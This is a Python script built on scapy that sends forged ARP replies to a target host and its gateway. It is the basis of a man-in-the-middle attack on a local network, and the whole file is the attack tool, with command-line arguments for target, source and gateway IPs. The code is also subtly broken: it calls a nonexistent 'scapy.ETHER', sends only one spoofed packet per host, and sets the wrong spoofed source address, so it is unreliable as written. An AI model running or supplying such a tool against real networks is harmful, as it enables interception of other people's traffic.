#!/usr/bin/env python

import scapy.all as scapy
import argparse


def spoof(target_ip, target_mac, source_ip):

    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip)  # op=2 stands for
    # the type of request
    scapy.send(packet)  # send the packet


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.ETHER(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def get_argument():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target-ip", dest="target_ip", help="IP to target interface")
    parser.add_argument("-s", "--source-ip", dest="source", help="IP to source")
    parser.add_argument("--gateway-ip", dest="gateway_ip", help="IP to target gateway")
    options = parser.parse_args()
    if not options.target_ip:
        parser.error("Introduce target's IP")
    elif not options.source:
        parser.error("Introduce source [YOU :) ]")
    elif not options.gateway_ip:
        parser.error("Introduce gateway's IP")
    return options


arguments = get_argument()
target_mac = get_mac(arguments.target_ip)
spoof(arguments.target_ip, target_mac, arguments.source)
gateway_mac = get_mac(arguments.gateway_ip)
spoof(arguments.gateway_ip, gateway_mac, arguments.source)




